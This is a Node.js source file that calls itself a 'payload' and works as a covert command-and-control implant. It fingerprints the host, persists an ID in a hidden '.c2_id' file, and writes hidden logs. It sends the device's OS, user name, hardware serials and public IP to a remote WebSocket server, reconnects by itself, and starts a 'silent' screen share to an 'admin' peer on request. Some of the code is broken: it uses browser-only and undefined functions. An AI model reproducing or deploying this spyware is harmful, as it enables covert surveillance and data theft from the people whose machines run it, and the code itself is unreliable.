const WebSocket = require('ws');
const http = require('http');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// --- CONFIGURATION ---
// Define WS_URL here to fix the ReferenceError
const WS_URL = process.env.WS_URL || 'wss://your-server-url.com'; 

// --- FORCE INSTALLATION CHECK ---
try {
    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
    if (!fs.existsSync(nodeModulesPath)) {
        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
        console.log("[FORCE] Installation complete.");
    }
} catch (e) {
    console.warn("[FORCE] Could not auto-install:", e.message);
}

// --- NATIVE WEBRTC IMPORTS ---
let wrtc;
try {
    // Attempt to load the native module
    wrtc = require('@roamhq/wrtc');
} catch (e) {
    console.error("Failed to require @roamhq/wrtc:", e.message);
}

// Check if the module actually has the required exports
const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;

if (!HAS_WEBRTC) {
    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
}

const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};

// --- LOGGING SYSTEM ---
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 console.log(`[${timestamp}] ${msg}`);
 try {
 fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
 if (ws && ws.readyState === WebSocket.OPEN && myId) {
 safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
 }
 } catch (e) {}
}

log("[INIT] Payload starting...");

// --- HARDWARE FINGERPRINT ---
function getHardwareFingerprint() {
 const mac = getMacAddress();
 const cpuSerial = getCpuSerial();
 const boardSerial = getBoardSerial();
 return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
 const interfaces = os.networkInterfaces();
 for (const name of Object.keys(interfaces)) {
 for (const iface of interfaces[name]) {
 if (iface.family === 'IPv4' && !iface.internal) {
 return iface.mac;
 }
 }
 }
 return '00:00:00:00:00:00';
}

function getCpuSerial() {
 try { 
 // Try Windows first
 return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); 
 } catch (e) {
 try { 
 // Fallback to Linux
 return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); 
 } catch (e2) { 
 // Final fallback to Node.js OS info
 return os.cpus()[0].model || 'unknown_cpu'; 
 } }
}

function getBoardSerial() {
 try { 
 // Try Windows first
 return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); 
 } catch (e) {
 try { 
 // Fallback to Linux
 return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); 
 } catch (e2) { 
 // Final fallback to Node.js OS info
 return os.hostname() || 'unknown_board'; 
 } }
}

// --- ID MANAGEMENT ---
let myId = null;
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
try {
 if (fs.existsSync(PERSIST_FILE)) {
 const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
 if (savedId && savedId.length > 0) myId = savedId;
 }
} catch(e) {}

if (!myId) {
 myId = getHardwareFingerprint();
 try { fs.writeFileSync(PERSIST_FILE, myId); } catch(e) {}
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function initConnection() {
 log(`[WS] Attempting silent connection to ${WS_URL}...`);

 ws = new WebSocket(WS_URL);

 ws.on('error', (err) => {
 log(`[WS] Connection error: ${err.message}`);
 isConnected = false;
 });

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 log(`[WS] Connected. Sending identity...`);
 
 // Get Real OS Name and Device Details
 let realOsName = '';
 let realUser = '';
 let realDeviceName = os.hostname() || 'Unknown'; // Fixed: Removed duplicate declaration
 let realManufacturer = '';
 let realModel = '';
 let realSerialNumber = '';
 let realCpu = '';

 const commandOptions = {
 encoding: 'utf8',
 timeout: 10000,
 stdio: ['ignore', 'pipe', 'ignore']
 };


 // Detect operating system and hardware
 if (process.platform === 'win32') {

 // Windows OS details
 try {
 realOsName = execSync(
 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"',
 commandOptions
 ).trim();
 } catch (e) {}

 if (!realOsName) {
 realOsName = 'Windows ' + os.release();
 }

 // Windows manufacturer
 try {
 realManufacturer = execSync(
 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"',
 commandOptions
 ).trim();
 } catch (e) {}

 // Windows device model
 try {
 realModel = execSync(
 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"',
 commandOptions
 ).trim();
 } catch (e) {}

 // Actual BIOS hardware serial number
 try {
 realSerialNumber = execSync(
 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"',
 commandOptions
 ).trim();
 } catch (e) {}

 // Actual CPU model
 try {
 realCpu = execSync(
 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"',
 commandOptions
 ).trim();
 } catch (e) {}

 } else if (process.platform === 'darwin') {

 // macOS OS details
 try {
 const macName = execSync('sw_vers -productName', commandOptions).trim();
 const macVersion = execSync('sw_vers -productVersion', commandOptions).trim();
 realOsName = [macName, macVersion].filter(Boolean).join(' ');
 } catch (e) {}

 if (!realOsName) {
 realOsName = 'macOS ' + os.release();
 }

 realManufacturer = 'Apple';

 // Mac hardware model
 try {
 realModel = execSync('sysctl -n hw.model', commandOptions).trim();
 } catch (e) {}

 // Mac hardware serial
 try {
 realSerialNumber = execSync(
 "system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'",
 commandOptions
 ).trim();
 } catch (e) {}

 // CPU model
 try {
 realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim();
 } catch (e) {
 realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
 }

 } else if (process.platform === 'linux') {

 // Linux distribution details
 try {
 realOsName = execSync(
 "grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'",
 commandOptions
 ).trim();
 } catch (e) {}

 if (!realOsName) {
 realOsName = 'Linux ' + os.release();
 }

 // Linux manufacturer
 try {
 realManufacturer = execSync(
 'cat /sys/class/dmi/id/sys_vendor',
 commandOptions
 ).trim();
 } catch (e) {}

 // Linux hardware model
 try {
 realModel = execSync(
 'cat /sys/class/dmi/id/product_name',
 commandOptions
 ).trim();
 } catch (e) {}

 // Linux hardware serial (may require elevated permissions)
 try {
 realSerialNumber = execSync(
 'cat /sys/class/dmi/id/product_serial',
 commandOptions
 ).trim();
 } catch (e) {}

 // Linux CPU model
 realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';

 } else {

 realOsName = process.platform + ' ' + os.release();
 realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
 }

 // Get the actual guest username using your working method
 try {
 realUser = os.userInfo().username || 'user';
 } catch (e) {
 realUser = 'user';
 }

 // Get the actual guest computer name
 // FIXED: Removed duplicate declaration of realDeviceName here
 const finalDeviceName = os.hostname() || 'Unknown';

 // Get the actual guest public IP using your working method
 let realIp = '';

 try {
 realIp = getExternalIP() || '';
 } catch (e) {
 realIp = myIp || '';
 }

 // Final hardware and system information
 const realRamGB = Number(
 (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2)
 );

 const realCpuCores = os.cpus().length;

 // Send actual guest device information
 // Preserve existing users table mapping
 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 fingerprint: myId,
 deviceName: finalDeviceName, // Use the local variable
 os: realOsName,
 arch: os.arch(),
 user: realUser,
 ip: realIp,
 last_seen: Date.now(),
 status: 'Online',
 created_at: Date.now(),
 serialNumber: realSerialNumber || realModel || 'Unknown'
 }));

 startMonitoring();
 });


 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 if (data.type === 'request_join') handleJoinRequest();
 else if (data.type === 'offer') handleOffer(data.sdp);
 else if (data.type === 'answer') handleAnswer(data.sdp);
 else if (data.type === 'candidate') handleCandidate(data.candidate);
 } catch (e) {
 log(`[WS] Message parse error: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 isConnected = false;
 log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
 setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
 reconnectAttempts++;
 });
}

function safeSend(msg) {
 if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
 setInterval(() => {
 if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
 }, 30000);
}

// --- WEBRTC (BROWSER NATIVE) ---
let peerConnection = null;
let localStream = null;

async function captureScreenPureJS() {
 if (!peerConnection) {
 peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 }

 const transceivers = peerConnection.getTransceivers();
 transceivers.forEach(t => {
 if (t.sender.track) t.sender.stop();
 });

 try {
 // Force screen share over camera if possible
 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
 stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

 peerConnection.onicecandidate = (event) => {
 if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
 };

 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
 } catch (err) {
 log(`[WEBRTC] Screen capture error: ${err.message}`);
 }
}

function handleJoinRequest() {
 log("[JOIN] Request received. Starting screen share silently...");
 captureScreenPureJS();
}

function handleOffer(offerSDP) {
 if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
 .then(() => peerConnection.createAnswer())
 .then(answer => peerConnection.setLocalDescription(answer))
 .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
 .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
}

function handleAnswer(answerSDP) {
 if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
}

function handleCandidate(candidate) {
 if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
}

// --- HTTP PORT LISTENER (For Render Health) ---
const PORT = Number(process.env.PORT) || 10000;
const server = http.createServer((req, res) => {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
});

server.listen(PORT, '0.0.0.0', () => {
 log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
 initConnection();
});
